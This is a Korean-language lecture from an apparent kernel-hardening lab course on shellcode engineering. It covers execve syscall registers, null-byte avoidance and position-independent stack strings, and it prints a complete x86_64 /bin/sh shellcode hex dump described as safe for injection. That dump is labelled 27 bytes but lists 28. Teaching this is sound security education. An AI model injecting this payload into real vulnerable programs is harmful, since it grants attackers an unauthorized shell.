# 04. 쉘코드 엔지니어링과 어셈블리 기계어 제작 (Shellcode Engineering)

바이너리 익스플로잇에서 CPU 제어권을 탈취한 공격자가 대화형 루트 쉘을 획득하기 위해 주입하는 순수 기계어 바이트 스트림인 **쉘코드(Shellcode)의 구조와 엔지니어링 제약**을 분석함.

---

## 1. 학습 목표 및 개요

- 쉘코드의 본질이 컴파일러나 링커 없이 CPU가 직접 해독 가능한 순수 기계어 바이트(Opcode)임을 이해함.
- 리눅스 64비트 시스템 콜 인터페이스(`execve("/bin/sh", NULL, NULL)`)의 레지스터 세팅 규칙을 규명함.
- `strcpy` 등 문자열 함수를 통과하기 위한 **Null Byte (`\x00`) 제거 원리**를 학습함.
- 하드코딩된 메모리 주소 없이 어디서나 구동 가능한 **위치 독립적 코드(Position-Independent Code / PIC)** 설계 기법을 분석함.
- x86_64(27바이트) 및 ARM64(36바이트) 쉘코드의 아키텍처별 어셈블리를 비교함.

---

## 2. 인터랙티브 쉘코드 바이트코드 & 아키텍처 인스펙터

아래 다이어그램에서 x86_64와 ARM64 쉘코드의 16진수 바이트열과 각 어셈블리 인스트럭션이 레지스터를 조작하는 과정을 비교 탐색 가능함:

<div style="width: 100%; height: 600px; margin: 24px 0; border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; overflow: hidden;">
  <iframe src="../../assets/diagrams/principles/04-shellcode.html" style="width: 100%; height: 100%; border: none;"></iframe>
</div>

---

## 3. 리눅스 `execve` 시스템 콜 규약

쉘코드의 최종 목표는 운영체제 커널의 `sys_execve` 시스템 콜을 발동시켜 프로세스 이미지를 `/bin/sh`로 교체하는 것임:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

- **x86_64 시스템 콜 규약**:
  - `RAX` = 59 (`0x3b`, `__NR_execve`)
  - `RDI` = `"/bin/sh"` 문자열의 가상 메모리 포인터 (1st 인자)
  - `RSI` = `["/bin/sh", NULL]` 포인터 배열 주소 (2nd 인자)
  - `RDX` = `NULL (0)` 환경변수 포인터 (3rd 인자)
  - `syscall` 명령어 실행
- **ARM64 시스템 콜 규약**:
  - `X8` = 221 (`0xdd`, `__NR_execve`)
  - `X0` = `"/bin/sh"` 문자열 포인터
  - `X1` = `NULL (0)`
  - `X2` = `NULL (0)`
  - `svc #0` 명령어 실행

---

## 4. 쉘코드 엔지니어링 3대 핵심 난제와 해결 기법

### 4.1 Null Byte (`\x00`) 완벽 제거 원리

취약한 함수(`strcpy`, `gets`, `sprintf`)는 `\x00` 바이트를 만나는 순간 문자열 복사를 조기 종료함:

- **문제 코드**: `mov $0, %eax` ➔ 기계어: `\xb8\x00\x00\x00\x00` (4개의 Null Byte 발생)
- **해결 기법**: `xor %eax, %eax` ➔ 기계어: `\x31\xc0` (Null Byte 0개로 EAX를 0으로 초기화)
- **시스템 콜 번호 주입**: `mov $59, %rax` 대신 `mov $0x3b, %al` (하위 8비트 레지스터 사용) ➔ `\xb0\x3b`

### 4.2 위치 독립성(PIC)과 스택 문자열 생성

ASLR이 켜져 있거나 스택 주소가 매번 달라져도 작동하도록, 쉘코드 자체 내부에서 스택을 활용해 문자열 주소를 계산함:

```nasm
xor    %eax, %eax
movabs $0x68732f2f6e69622f, %rbx ; "/bin//sh" 리틀엔디언 역순
push   %rbx                      ; 스택에 문자열 배치
mov    %rsp, %rdi                ; 현재 스택 포인터(RSP)를 RDI에 적재
```

### 4.3 리틀 엔디언(Little-Endian) 바이트 정렬

인텔/ARM 64비트 프로세서는 리틀 엔디언을 사용하므로, 문자열 `"/bin//sh"`를 8바이트 정수로 표현할 때 역순으로 바이트를 배열해야 함:

```
문자열:  '/'   'b'   'i'   'n'   '/'   '/'   's'   'h'
ASCII:  0x2f  0x62  0x69  0x6e  0x2f  0x2f  0x73  0x68
64비트: 0x68732f2f6e69622f
```

---

## 5. 실습 소스 코드 및 바이트코드 검증

- **실습 소스 코드**: [`shellcode_tester.c`](../../assets/labs/principles/04-shellcode/shellcode_tester.c) (로컬 원본) | [GitHub 소스 코드 저장소 :octicons-mark-github-16:](https://github.com/auking45/linux-kernel-hardening-lab/blob/main/labs/principles/04-shellcode/shellcode_tester.c)
- **전용 Makefile**: [`Makefile`](../../assets/labs/principles/04-shellcode/Makefile)

### 5.1 쉘코드 바이트열 및 Null-Byte 검사

```bash
cd labs/principles/04-shellcode
make run
```

```
=== Linux Kernel Hardening Lab - Shellcode Engineering ===

============================================================
 Shellcode Inspection [x86_64] (Total Length: 27 bytes)
============================================================
[Hex Dump]
  \x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68
  \x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6
  \xb0\x3b\x0f\x05

[Analysis]
  [+] Null-Byte Check: PASSED (0 null bytes detected).
      Safe for injection into strcpy(), gets(), sprintf().
============================================================
```

### 5.2 쉘코드 직접 실행 테스트 (옵션)

`make run-exec`를 실행하면 메모리 페이지에 `PROT_EXEC` 권한을 부여하고 해당 쉘코드로 점프하여 대화형 쉘이 기동되는 과정을 직접 검증 가능함.

---

## 6. 요약 및 다음 강의

- 쉘코드는 Null Byte가 배제되고 위치 독립적으로 작성된 순수 기계어 조각임.
- 다음 강의에서는 이 쉘코드나 임의의 함수 주소로 CPU 제어권을 점프시키기 위해 스택 메모리를 붕괴시키는 **[05. 클래식 버퍼 오버플로우와 RIP 장악](05-stack-bof-rip.md)**을 학습함.
